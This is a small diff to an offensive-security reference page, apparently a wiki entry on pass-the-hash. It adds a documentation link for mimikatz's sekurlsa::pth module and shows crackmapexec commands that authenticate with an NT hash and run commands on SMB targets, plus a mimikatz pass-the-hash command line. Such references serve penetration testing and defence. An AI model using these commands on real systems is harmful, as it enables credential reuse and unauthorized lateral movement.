@@ -59,7 +59,7 @@ crackmapexec smb $TARGETS --local-auth -u $USER -H $NThash -x whoami
 crackmapexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -x whoami
 ```
 
-On Windows, [mimikatz](https://github.com/gentilkiwi/mimikatz) (C) can pass-the-hash and open an elevated command prompt.
+On Windows, [mimikatz](https://github.com/gentilkiwi/mimikatz) (C) can pass-the-hash and open an elevated command prompt with [`sekurlsa::pth`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/pth).
 
 ```bash
 sekurlsa::pth /user:$USER /domain:$DOMAIN /ntlm:$NThash
